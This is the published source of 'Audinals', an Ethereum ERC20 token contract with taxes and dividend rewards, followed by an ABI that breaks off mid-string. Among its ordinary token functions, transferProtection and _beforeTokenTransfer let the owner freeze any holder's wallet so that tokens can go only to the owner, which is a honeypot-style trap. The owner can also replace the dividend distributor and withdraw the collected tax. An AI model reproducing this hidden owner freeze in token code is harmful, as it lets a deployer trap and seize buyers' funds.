{"SourceCode": "/*\r\nAUDINALS\r\nWebsite: https://www.audinals.io/\r\nTelegram: https://t.me/audinalsofficial\r\nTwitter: https://twitter.com/audinalsmusic\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.21;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event. C U ON THE MOON\r\n     */\r\n    function transfer(address recipient, uint256 amount)\r\n        external\r\n        returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender's allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller's\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n}\r\n\r\ninterface IERC20Metadata is IERC20 {\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token.\r\n     */\r\n    function symbol() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the decimals places of the token.\r\n     */\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    mapping(address => uint256) private _balances;\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account)\r\n        public\r\n        view\r\n        virtual\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        public\r\n        virtual\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender)\r\n        public\r\n        view\r\n        virtual\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount)\r\n        public\r\n        virtual\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        if(currentAllowance != type(uint256).max) { \r\n            require(\r\n                currentAllowance >= amount,\r\n                \"ERC20: transfer amount exceeds allowance\"\r\n            );\r\n            unchecked {\r\n                _approve(sender, _msgSender(), currentAllowance - amount);\r\n            }\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        _approve(\r\n            _msgSender(),\r\n            spender,\r\n            _allowances[_msgSender()][spender] + addedValue\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(\r\n            currentAllowance >= subtractedValue,\r\n            \"ERC20: decreased allowance below zero\"\r\n        );\r\n        unchecked {\r\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(\r\n            senderBalance >= amount,\r\n            \"ERC20: transfer amount exceeds balance\"\r\n        );\r\n        unchecked {\r\n            _balances[sender] = senderBalance - amount;\r\n        }\r\n        _balances[recipient] += amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _initialTransfer(address to, uint256 amount) internal virtual {\r\n        _balances[to] = amount;\r\n        _totalSupply += amount;\r\n        emit Transfer(address(0), to, amount);\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ninterface USDT {\r\n    function balanceOf(address who) external returns (uint);\r\n    function transfer(address to, uint value) external;\r\n    function approve(address spender, uint value) external;\r\n}\r\n\r\ninterface IDividendDistributor {\r\n    function initialize() external;\r\n    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution, uint256 _claimAfter) external;\r\n    function setShare(address shareholder, uint256 amount) external;\r\n    function deposit() external payable;\r\n    function claimDividend(address shareholder) external;\r\n    function getUnpaidEarnings(address shareholder) external view returns (uint256);\r\n    function getPaidDividends(address shareholder) external view returns (uint256);\r\n    function getTotalPaid() external view returns (uint256);\r\n    function getClaimTime(address shareholder) external view returns (uint256);\r\n    function getLostRewards(address shareholder) external view returns (uint256);\r\n    function getTotalDividends() external view returns (uint256);\r\n    function getTotalDistributed() external view returns (uint256);\r\n    function getTotalSacrificed() external view returns (uint256);\r\n    function countShareholders() external view returns (uint256);\r\n    function migrate(address newDistributor) external;\r\n}\r\n\r\ninterface ILpPair {\r\n    function sync() external;\r\n}\r\n\r\ninterface IDexRouter {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external payable;\r\n\r\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n        external\r\n        payable\r\n        returns (uint[] memory amounts);\r\n\r\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\r\n        external\r\n        payable\r\n        returns (uint[] memory amounts);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (\r\n            uint256 amountToken,\r\n            uint256 amountETH,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function getAmountsOut(uint256 amountIn, address[] calldata path)\r\n        external\r\n        view\r\n        returns (uint256[] memory amounts);\r\n}\r\n\r\ninterface IDexFactory {\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n}\r\n\r\ncontract Audinals is ERC20, Ownable {\r\n    IDexRouter public immutable dexRouter;\r\n    address public lpPair;\r\n\r\n    mapping(address => uint256) public walletProtection;\r\n\r\n    uint8 constant _decimals = 9;\r\n    uint256 constant _decimalFactor = 10 ** _decimals;\r\n\r\n    bool private swapping;\r\n    uint256 public swapTokensAtAmount;\r\n    uint256 public maxSwapTokens;\r\n\r\n    IDividendDistributor public distributor;\r\n    address public taxCollector;\r\n    uint256 public taxSplit = 3;\r\n\r\n    bool public swapEnabled = true;\r\n\r\n    uint256 public tradingActiveTime;\r\n\r\n    mapping(address => bool) private _isExcludedFromFees;\r\n    mapping (address => bool) public isDividendExempt;\r\n    mapping(address => bool) public pairs;\r\n\r\n    event SetPair(address indexed pair, bool indexed value);\r\n    event ExcludeFromFees(address indexed account, bool isExcluded);\r\n\r\n    constructor() ERC20(\"Audinals\", \"AUDO\") {\r\n        address newOwner = msg.sender;\r\n        taxCollector = newOwner;\r\n\r\n        address routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n        dexRouter = IDexRouter(routerAddress);\r\n\r\n        _approve(msg.sender, routerAddress, type(uint256).max);\r\n        _approve(address(this), routerAddress, type(uint256).max);\r\n\r\n        uint256 totalSupply = 1_000_000_000 * _decimalFactor;\r\n\r\n        swapTokensAtAmount = (totalSupply * 1) / 10000; // 0.01 %\r\n        maxSwapTokens = (totalSupply * 5) / 1000; // 0.5 %\r\n\r\n        _isExcludedFromFees[newOwner] = true;\r\n        _isExcludedFromFees[address(this)] = true;\r\n\r\n        isDividendExempt[routerAddress] = true;\r\n        isDividendExempt[address(this)] = true;\r\n        isDividendExempt[address(0xdead)] = true;\r\n\r\n        _initialTransfer(newOwner, totalSupply);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function decimals() public pure override returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n    function updateSwapTokens(uint256 atAmount, uint256 maxAmount) external onlyOwner {\r\n        require(maxAmount <= (totalSupply() * 1) / 100, \"Max swap cannot be higher than 1% supply.\");\r\n        swapTokensAtAmount = atAmount;\r\n        maxSwapTokens = maxAmount;\r\n    }\r\n\r\n    function toggleSwap() external onlyOwner {\r\n        swapEnabled = !swapEnabled;\r\n    }\r\n\r\n    function setPair(address pair, bool value)\r\n        external\r\n        onlyOwner\r\n    {\r\n        require(\r\n            pair != lpPair,\r\n            \"The pair cannot be removed from pairs\"\r\n        );\r\n\r\n        pairs[pair] = value;\r\n        isDividendExempt[pair] = true;\r\n        emit SetPair(pair, value);\r\n    }\r\n\r\n    function getSellFees() public view returns (uint256) {\r\n        if(block.number - tradingActiveTime > 2) return 5;\r\n        if(block.number - tradingActiveTime > 1) return 10;\r\n        return 15;\r\n    }\r\n\r\n    function getBuyFees() public view returns (uint256) {\r\n        if(block.number - tradingActiveTime > 2) return 5;\r\n        if(block.number - tradingActiveTime > 1) return 10;\r\n        return 15;\r\n    }\r\n\r\n    function excludeFromFees(address[] calldata accounts, bool excluded) public onlyOwner {\r\n        for (uint256 i = 0; i < accounts.length; i++) {\r\n            _isExcludedFromFees[accounts[i]] = excluded;\r\n            emit ExcludeFromFees(accounts[i], excluded);\r\n        }\r\n    }\r\n\r\n    function setDividendExempt(address[] calldata holders, bool exempt) external onlyOwner {\r\n        for (uint256 i = 0; i < holders.length; i++) {\r\n            isDividendExempt[holders[i]] = exempt;\r\n            if(exempt){\r\n                distributor.setShare(holders[i], 0);\r\n            }else{\r\n                distributor.setShare(holders[i], balanceOf(holders[i]));\r\n            }\r\n        }\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal override {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"amount must be greater than 0\");\r\n\r\n        if(tradingActiveTime == 0) {\r\n            require(from == owner() || to == owner() || from == address(this) || to == address(this), \"Trading not yet active\");\r\n            super._transfer(from, to, amount);\r\n        }\r\n        else {\r\n            if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {\r\n                uint256 fees = 0;\r\n                uint256 _sf = getSellFees();\r\n                uint256 _bf = getBuyFees();\r\n\r\n                if (pairs[to]) {\r\n                    if(_sf > 0)\r\n                        fees = (amount * _sf) / 100;\r\n\r\n                    if (!isDividendExempt[from]) {\r\n                        isDividendExempt[from] = true;\r\n                        try distributor.setShare(from, 0) {} catch {}\r\n                    }\r\n                }\r\n                else if (_bf > 0 && pairs[from]) {\r\n                    fees = (amount * _bf) / 100;\r\n                }\r\n\r\n                if (fees > 0) {\r\n                    super._transfer(from, address(this), fees);\r\n                }\r\n\r\n                amount -= fees;\r\n\r\n                if (swapEnabled && !swapping && pairs[to]) {\r\n                    swapping = true;\r\n                    swapBack(amount);\r\n                    swapping = false;\r\n                }\r\n            }\r\n\r\n            super._transfer(from, to, amount);\r\n        }\r\n\r\n        _beforeTokenTransfer(from, to);\r\n\r\n        if(!isDividendExempt[from]){ try distributor.setShare(from, balanceOf(from)) {} catch {} }\r\n        if(!isDividendExempt[to]){ try distributor.setShare(to, balanceOf(to)) {} catch {} }\r\n    }\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = dexRouter.WETH();\r\n\r\n        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0, // accept any amount of ETH\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function swapBack(uint256 amount) private {\r\n        uint256 amountToSwap = balanceOf(address(this));\r\n        if (amountToSwap < swapTokensAtAmount) return;\r\n        if (amountToSwap > maxSwapTokens) amountToSwap = maxSwapTokens;\r\n        if (amountToSwap > amount) amountToSwap = amount;\r\n        if (amountToSwap == 0) return;\r\n\r\n        uint256 ethBalance = address(this).balance;\r\n\r\n        swapTokensForEth(amountToSwap);\r\n\r\n        uint256 generated = address(this).balance - ethBalance;\r\n\r\n        if(generated > 0) {\r\n            uint256 _split = (getBuyFees() - taxSplit) * generated / getBuyFees();\r\n            if(_split > 0)\r\n                try distributor.deposit{value: _split}() {} catch {}\r\n        }\r\n    }\r\n\r\n    function withdrawTax() external {\r\n        require(msg.sender == owner() || msg.sender == taxCollector, \"Unauthorised\");\r\n        bool success;\r\n        (success, ) = address(msg.sender).call{value: address(this).balance}(\"\");\r\n    }\r\n\r\n    function updateSplit(uint256 _split) external onlyOwner {\r\n        require(_split <= 5, \"Max normal tax is 5%\");\r\n        taxSplit = _split;\r\n    }\r\n\r\n    function prepare(uint256 tokens) external payable onlyOwner {\r\n        require(tradingActiveTime == 0);\r\n        require(msg.value > 0, \"Insufficient funds\");\r\n        require(tokens > 0, \"No LP tokens specified\");\r\n\r\n        address ETH = dexRouter.WETH();\r\n\r\n        lpPair = IDexFactory(dexRouter.factory()).createPair(ETH, address(this));\r\n        pairs[lpPair] = true;\r\n        isDividendExempt[lpPair] = true;\r\n\r\n        super._transfer(msg.sender, address(this), tokens * _decimalFactor);\r\n\r\n        dexRouter.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,msg.sender,block.timestamp);\r\n    }\r\n\r\n    function launch() external onlyOwner {\r\n        require(tradingActiveTime == 0);\r\n        tradingActiveTime = block.number;\r\n    }\r\n\r\n    function setDistributor(address _distributor, bool migrate) external onlyOwner {\r\n        if(migrate) \r\n            distributor.migrate(_distributor);\r\n\r\n        distributor = IDividendDistributor(_distributor);\r\n        distributor.initialize();\r\n    }\r\n\r\n    function setTaxCollector(address _collector) external onlyOwner {\r\n        taxCollector = _collector;\r\n    }\r\n\r\n    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution, uint256 _claimAfter) external onlyOwner {\r\n        distributor.setDistributionCriteria(_minPeriod, _minDistribution, _claimAfter);\r\n    }\r\n\r\n    function manualDeposit() payable external {\r\n        distributor.deposit{value: msg.value}();\r\n    }\r\n\r\n    function getPoolStatistics() external view returns (uint256 totalRewards, uint256 totalRewardsPaid, uint256 rewardsSacrificed, uint256 rewardHolders) {\r\n        totalRewards = distributor.getTotalDividends();\r\n        totalRewardsPaid = distributor.getTotalDistributed();\r\n        rewardsSacrificed = distributor.getTotalSacrificed();\r\n        rewardHolders = distributor.countShareholders();\r\n    }\r\n    \r\n    function myStatistics(address wallet) external view returns (uint256 share, uint256 reward, uint256 rewardClaimed, uint256 rewardsLost, uint256 claimTime) {\r\n        share = distributor.getUnpaidEarnings(wallet);\r\n\t    reward = distributor.getUnpaidEarnings(wallet);\r\n\t    rewardClaimed = distributor.getPaidDividends(wallet);\r\n\t    rewardsLost = distributor.getLostRewards(wallet);\r\n        claimTime = distributor.getClaimTime(wallet);\r\n\t}\r\n\t\r\n\tfunction checkClaimTime(address wallet) external view returns (uint256) {\r\n\t    return distributor.getClaimTime(wallet);\r\n\t}\r\n\t\r\n\tfunction claim() external {\r\n\t    distributor.claimDividend(msg.sender);\r\n\t}\r\n\r\n    function airdropToWallets(address[] calldata wallets, uint256[] calldata amountsInTokens, bool rewards) external onlyOwner {\r\n        require(wallets.length == amountsInTokens.length, \"Arrays must be the same length\");\r\n\r\n        for (uint256 i = 0; i < wallets.length; i++) {\r\n            super._transfer(msg.sender, wallets[i], amountsInTokens[i] * _decimalFactor);\r\n            if(rewards)\r\n                distributor.setShare(wallets[i], amountsInTokens[i] * _decimalFactor);\r\n            else\r\n                isDividendExempt[wallets[i]] = true;\r\n        }\r\n    }\r\n\r\n    function transferProtection(address[] calldata _wallets, uint256 _enabled) external onlyOwner {\r\n        for(uint256 i = 0; i < _wallets.length; i++) {\r\n            walletProtection[_wallets[i]] = _enabled;\r\n        }\r\n    }\r\n\r\n    function _beforeTokenTransfer(address from, address to) internal view {\r\n        require(walletProtection[from] == 0 || to == owner(), \"Wallet protection enabled, please contact support\");\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"isExcluded\",\"type\":\"bool\"}],\"name\":\"ExcludeFromFees\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"SetPair\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"wallets\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"amountsInTokens\",\"type\":\"uint256[]\"},{\"internalType\":\"bool\",\"name\":\"rewards\",\"type\":\"bool\"}],\"name\":\"airdropToWallets\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"wallet\",\"type\":\"address\"}],\"name\":\"checkClaimTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"claim\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"dexRouter\",\"outputs\":[{\"internalType\":\"contract IDexRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"distributor\",\"outputs\":[{\"internalType\":\"contract IDividendDistributor\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"excluded\",\"type\":\"bool\"}],\"name\":\"excludeFromFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBuyFees\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getPoolStatistics\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"totalRewards\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalRewardsPaid\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"rewardsSacrificed\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"rewardHolders\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getSellFees\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isDividendExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lpPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualDeposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSwapTokens\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"wallet\",\"type\":\"address\"}],\"name\":\"myStatistics\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"share\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"reward\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"rewardClaimed\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"rewardsLost\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"claimTime\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"pairs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"prepare\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_minPeriod\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_minDistribution\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_claimAfter\",\"type\":\"uint256\"}],\"name\":\"setDistributionCriteria\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_distributor\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"migrate\",\"type\":\"bool\"}],\"name\":\"setDistributor\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"holders\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setDividendExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"pai